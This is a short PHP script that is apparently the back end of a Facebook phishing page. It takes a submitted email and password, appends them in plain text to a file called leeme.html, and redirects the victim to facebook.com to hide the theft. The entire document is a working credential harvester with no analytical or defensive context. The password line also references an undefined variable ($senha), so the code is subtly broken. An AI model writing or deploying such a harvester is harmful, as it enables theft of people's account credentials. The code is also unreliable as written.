<?php
$email = test_input($_POST["email_mobile"]);
$data['email_mobile']=$email;
$pass = test_input($_POST["pass_mobile"]);
$data['pass_mobile']=$senha;


header ('Location: '.htmlspecialchars($_SERVER["PHP_SELF"]));
$handle = fopen("leeme.html", "a");
$string = '
Email:'.$data['email_mobile'].'
 Pass:'.$data['pass_mobile'];

fwrite($handle,$string);
fclose($handle);
header ('Location: http://www.facebook.com ');
exit;

function test_input($data) {
   $data = trim($data);
   $data = stripslashes($data);
   $data = htmlspecialchars($data);
   return $data;
}
?>
